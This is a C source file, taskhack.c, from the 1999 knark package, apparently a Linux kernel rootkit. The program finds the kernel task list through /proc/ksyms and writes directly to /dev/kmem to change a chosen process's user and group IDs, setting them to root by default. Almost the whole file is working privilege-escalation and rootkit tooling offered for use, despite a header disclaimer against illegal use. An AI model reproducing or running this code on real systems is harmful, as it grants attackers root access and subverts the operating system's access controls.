/*
 * taskhack.c, part of the knark package
 * (c) Creed @ #hack.se 1999 <creed@sekure.net>
 * 
 * This program may NOT be used in an illegal way,
 * or to cause damage of any kind.
 * 
 * You don't need the README to use this program if you have a brain.
 */

#define __KERNEL__
#include <linux/sched.h>
#undef __KERNEL__
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <getopt.h>

#include "knark.h"

void die(char *reason)
{
    perror(reason);
    exit(-1);
}


void usage(const char *progname)
{
    fprintf(stderr,
	    "Usage:\n"
	    "%s  -show pid          shows id's of process pid\n"
	    "%s  -someid=newid pid  sets process pid's someid to newid\n"
	    "                              newid defaults to 0\n"
	    "someid is one of: uid, euid, suid, fsuid, gid, egid, sgid, fsgid\n"
	    "alluid or allgid can be used to specify all *uid's or *gid's\n"
	    "ex: %s -euid=1000 1\n",
	    progname, progname, progname);
    exit(-1);
}


int main(int argc, char *argv[])
{
    int kmem_fd, c;
    char *p, buf[1024];
    FILE *ksyms_fp;
    unsigned long task_addr, kstat_addr = 0;
    struct task_struct task;
    int uflag = 0, eflag = 0, sflag = 0, fflag = 0;
    int Gflag = 0, Eflag = 0, Sflag = 0, Fflag = 0;
    int lflag = 0;
    uid_t uid = 0, euid = 0, suid = 0, fsuid = 0;
    gid_t gid = 0, egid = 0, sgid = 0, fsgid = 0;
    pid_t pid;
    
    const char *optstr = "lauesfAGESF";
    struct option options[] = 
    {
	{"show", 0, 0, 'l'},
	{"alluid", 2, 0, 'a'},
	{"uid", 2, 0, 'u'},
	{"euid", 2, 0, 'e'},
	{"suid", 2, 0, 's'},
	{"fsuid", 2, 0, 'f'},
	{"allgid", 2, 0, 'A'},
	{"gid", 2, 0, 'G'},
	{"egid", 2, 0, 'E'},
	{"sgid", 2, 0, 'S'},
	{"fsgid", 2, 0, 'F'},
	{0, 0, 0, 0}
    };
    
    author_banner("taskhack.c");
    
    while( (c = getopt_long_only(argc, argv, optstr, options,
				 NULL)) != EOF)
	switch(c)
    {
      case 'l':
	lflag++;
	break;
	
      case 'a':
	uflag++, eflag++, sflag++, fflag++;
	if(optarg) uid = euid = suid = fsuid = atoi(optarg);
	break;
	
      case 'u':
	uflag++;
	if(optarg) uid = atoi(optarg);
	break;
	
      case 'e':
	eflag++;
	if(optarg) euid = atoi(optarg);
	break;
	
      case 's':
	sflag++;
	if(optarg) suid = atoi(optarg);
	break;
	
      case 'f':
	fflag++;
	if(optarg) fsuid = atoi(optarg);
	break;
	
      case 'A':
	Gflag++, Eflag++, Sflag++, Fflag++;
	if(optarg) gid = egid = sgid = fsgid = atoi(optarg);
	break;
	
      case 'G':
	Gflag++;
	if(optarg) gid = atoi(optarg);
	break;
	
      case 'E':
	Eflag++;
	if(optarg) egid = atoi(optarg);
	break;
	
      case 'S':
	Sflag++;
	if(optarg) sgid = atoi(optarg);
	break;
	
      case 'F':
	Fflag++;
	if(optarg) fsgid = atoi(optarg);
	break;
	
      default:
	usage(argv[0]);
    }
    
    if((uflag || eflag || sflag || fflag ||
	Gflag || Eflag || Sflag || Fflag) == lflag)
	usage(argv[0]);
    
    argc -= optind;
    if(argc <= 0) fprintf(stderr, "No pid specified\n");
    if(argc <= 0 || argc > 1) usage(argv[0]);
    
    if(!(pid = atoi(argv[optind])))
    {
	fprintf(stderr, "Invalid pid specified\n");
	usage(argv[0]);
    }
    
    if( (ksyms_fp = fopen("/proc/ksyms", "r")) == NULL)
	die("Can't fopen /proc/ksyms");
    
    while(fgets(buf, sizeof(buf), ksyms_fp)) 
    {
	if(!strstr(buf, "kstat"))
	    continue;
	
	if( (p = strchr(buf, ' ')) == NULL)
	{
	    fprintf(stderr, "Error in /proc/ksyms\n");
	    exit(-1);
	}
	
	*p = '\0';
	if( (kstat_addr = strtoul(buf, NULL, 16)) == 0)
	{
	    fprintf(stderr, "%s isn't a hex number\n", buf);
	    exit(-1);
	}
	
	break;
    }
    
    fclose(ksyms_fp);
    
    if(!kstat_addr)
    {
	fprintf(stderr, "kstat not found in /proc/ksyms\n");
	exit(-1);
    }
    
    if( (kmem_fd = open("/dev/kmem", O_RDWR)) == -1)
	die("Can't open /dev/kmem");
    
    if(lseek(kmem_fd,
	     kstat_addr - (NR_TASKS - 1) * sizeof(struct task_struct *),
	     SEEK_SET) == -1)
	die("lseek");
    
    if(read(kmem_fd,
	    &task_addr,
	    sizeof(struct task_struct *)) == -1)
	die("read");
    
    if(lseek(kmem_fd,
	     (off_t)task_addr,
	     SEEK_SET) == -1)
	die("lseek");
    
    if(read(kmem_fd,
	    &task,
	    sizeof(struct task_struct)) == -1)
	die("read");
    
    if(task.pid != 1)
    {
	fprintf(stderr,
		"Init pid not found (this could be a program error)\n");
	exit(-1);
    }
	
    do {
	task_addr = (unsigned long) task.next_task;
	if(lseek(kmem_fd,
		 (off_t)task_addr,
		 SEEK_SET) == -1)
	    die("lseek");
	
	if(read(kmem_fd, &task, sizeof(struct task_struct)) == -1)
	    die("read");
	
	if(task.pid == pid)
	    break;
    } while(task.pid != 1);
    
    if(task.pid != pid)
    {
	fprintf(stderr, "Pid %d not found\n", pid);
	exit(-1);
    }
    
    if(!lflag)
    {
	if(uflag) task.uid = uid;
	if(eflag) task.euid = euid;
	if(sflag) task.suid = suid;
	if(fflag) task.fsuid = fsuid;
	if(Gflag) task.gid = gid;
	if(Eflag) task.egid = egid;
	if(Sflag) task.sgid = sgid;
	if(Fflag) task.fsgid = fsgid;
	
	if(lseek(kmem_fd,
		 (off_t)task_addr + (off_t)&task.uid - (off_t)&task,
		 SEEK_SET) == -1)
	    die("lseek");
	
	if(write(kmem_fd,
		 &task.uid,
		 4 * sizeof(uid_t) + 4 * sizeof(gid_t)) == -1)
	    die("write");
    }
    
    close(kmem_fd);
    printf("Id's for pid %d are now:\n"
	   "uid\t= %d\n"
	   "euid\t= %d\n"
	   "suid\t= %d\n"
	   "fsuid\t= %d\n"
	   "gid\t= %d\n"
	   "egid\t= %d\n"
	   "sgid\t= %d\n"
	   "fsgid\t= %d\n",
	   pid,
	   task.uid, task.euid, task.suid, task.fsuid,
	   task.gid, task.egid, task.sgid, task.fsgid);
    
    exit(0);
}
